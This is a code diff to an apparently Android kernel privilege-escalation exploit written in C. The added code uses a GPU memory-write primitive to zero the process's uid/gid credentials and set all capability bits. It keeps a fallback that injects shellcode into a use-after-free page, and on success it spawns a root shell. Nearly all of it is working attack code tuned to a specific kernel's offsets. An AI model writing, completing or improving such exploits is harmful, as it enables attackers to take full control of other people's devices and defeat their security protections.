@@ -1096,6 +1096,47 @@ cleanup:
     return result;
 }
 
+static int find_comm_offset(uint8_t *task_data, size_t size)
+{
+    for (int i = 0; i < (int)size - 16; i++)
+    {
+        if (memcmp(task_data + i, MARKER_NAME, 8) == 0)
+        {
+            return i;
+        }
+    }
+    return -1;
+}
+
+static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
+{
+    if ((cred_ptr & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
+        return -1;
+
+    fprintf(stderr, "[GPU_CRED] Patching cred @ 0x%lx via GPU\n", (unsigned long)cred_ptr);
+
+    uint8_t zero_creds[32] = {0};
+    if (gpu_write_task_virt(fd, cred_ptr + 4, zero_creds, sizeof(zero_creds)) != 0)
+        return -1;
+
+    if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
+    {
+        if (gpu_write_task_virt(fd, real_cred_ptr + 4, zero_creds, sizeof(zero_creds)) != 0)
+            return -1;
+    }
+
+    // Patch capabilities to all 1s (0xff)
+    uint8_t all_caps[32];
+    memset(all_caps, 0xff, 32);
+    // Common offsets for capabilities in struct cred:
+    // cap_inheritable (0x30), cap_permitted (0x38), cap_effective (0x40), cap_bset (0x48), cap_ambient (0x50)
+    gpu_write_task_virt(fd, cred_ptr + 0x30, all_caps, 32);
+    if (real_cred_ptr != 0 && real_cred_ptr != cred_ptr)
+        gpu_write_task_virt(fd, real_cred_ptr + 0x30, all_caps, 32);
+
+    return 0;
+}
+
 static void safe_cred_patch(void)
 {
     uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
@@ -1147,21 +1188,41 @@ static void safe_cred_patch(void)
         }
     }
 
-    fprintf(stderr, "[CHILD] Step 2: Injecting shellcode into UAF page...\n");
-    uint64_t shellcode_va = task_va & ~(uint64_t)(PAGE_SIZE - 1);
-    shellcode_va += 0x1000;
+    fprintf(stderr, "[CHILD] Step 2: Patching cred structure via GPU...\n");
+    uint8_t task_data[4096];
+    if (gpu_read_task_struct(fd, task_va, task_data, 4096) == 0) {
+        // We use the hardcoded offsets for your specific kernel
+        uint64_t cred_ptr = *(uint64_t *)(task_data + OFFSET_CRED);
+        uint64_t real_cred_ptr = *(uint64_t *)(task_data + OFFSET_REAL_CRED);
+        
+        fprintf(stderr, "[CHILD] Found cred_ptr=0x%lx real_cred_ptr=0x%lx at offsets 0x%x/0x%x\n", 
+                (unsigned long)cred_ptr, (unsigned long)real_cred_ptr, OFFSET_CRED, OFFSET_REAL_CRED);
 
-    if (inject_shellcode_to_uaf(fd, shellcode_va, shellcode, shellcode_len) == 0) {
-        fprintf(stderr, "[CHILD] [+] Shellcode injected at VA 0x%lx\n", (unsigned long)shellcode_va);
-        patched = 1;
-        gb_target_addr = shellcode_va;
-        g_shellcode_va = shellcode_va;
-        *(uint64_t *)&gbuf[GBUF_LIB_BASE] = shellcode_va;
-        gbuf[GBUF_TASK_SPRAY] = 0x2;
-        fprintf(stderr, "[CHILD] [+] Shellcode injection SUCCESS!\n");
+        if (patch_cred_via_gpu(fd, cred_ptr, real_cred_ptr) == 0) {
+            fprintf(stderr, "[CHILD] [+] Cred patch SUCCESSFUL via GPU!\n");
+            patched = 1;
+        }
+    }
+
+    if (!patched) {
+        fprintf(stderr, "[CHILD] Step 3: Falling back to shellcode injection...\n");
+        uint64_t shellcode_va = task_va & ~(uint64_t)(PAGE_SIZE - 1);
+        shellcode_va += 0x1000;
+
+        if (inject_shellcode_to_uaf(fd, shellcode_va, shellcode, shellcode_len) == 0) {
+            fprintf(stderr, "[CHILD] [+] Shellcode injected at VA 0x%lx\n", (unsigned long)shellcode_va);
+            patched = 1;
+            gb_target_addr = shellcode_va;
+            g_shellcode_va = shellcode_va;
+            *(uint64_t *)&gbuf[GBUF_LIB_BASE] = shellcode_va;
+            gbuf[GBUF_TASK_SPRAY] = 0x2;
+            fprintf(stderr, "[CHILD] [+] Shellcode injection SUCCESS!\n");
+        } else {
+            fprintf(stderr, "[CHILD] [!] Shellcode injection FAILED\n");
+            gbuf[GBUF_TASK_SPRAY] = 0x1;
+        }
     } else {
-        fprintf(stderr, "[CHILD] [!] Shellcode injection FAILED\n");
-        gbuf[GBUF_TASK_SPRAY] = 0x1;
+        gbuf[GBUF_TASK_SPRAY] = 0x2;
     }
 }
 
@@ -2443,6 +2504,17 @@ restart:;
                 {
                     fprintf(stderr, "[SPRAY %d] Triggered! Patching cred...\n", i);
                     safe_cred_patch();
+                    
+                    uid_t current_uid = getuid();
+                    if (current_uid == 0) {
+                        fprintf(stderr, "[SPRAY %d] [+] ROOT ESCALATION SUCCESSFUL!\n", i);
+                        fprintf(stderr, "[SPRAY %d] [+] Spawning root shell...\n", i);
+                        // Use a non-interactive check or just spawn a shell
+                        system("id; /system/bin/sh");
+                        exit(0);
+                    } else {
+                        fprintf(stderr, "[SPRAY %d] [!] Cred patch failed to change UID (current=%d)\n", i, current_uid);
+                    }
                     return 0;
                 }
                 usleep(50000);
@@ -2896,19 +2968,14 @@ restart:;
             }
         } else {
             fprintf(stderr, "[!] No root process found!\n");
-            fprintf(stderr, "[+] Trying to become root via direct syscall...\n");
+            fprintf(stderr, "[+] Checking if current process is already root...\n");
             
-            setuid(0);
-            setgid(0);
-            setresuid(0, 0, 0);
-            setresgid(0, 0, 0);
-            
-            uid_t new_uid = getuid();
-            fprintf(stderr, "[+] UID after direct syscall: %d\n", new_uid);
-            
-            if (new_uid == 0) {
+            uid_t current_uid = getuid();
+            if (current_uid == 0) {
                 fprintf(stderr, "[+] ROOT! Spawning shell...\n");
-                system("/data/data/com.termux/files/usr/bin/bash");
+                system("/system/bin/sh");
+            } else {
+                fprintf(stderr, "[!] Current UID is %d. Exploit might have failed or is running in a child.\n", current_uid);
             }
         }
     }
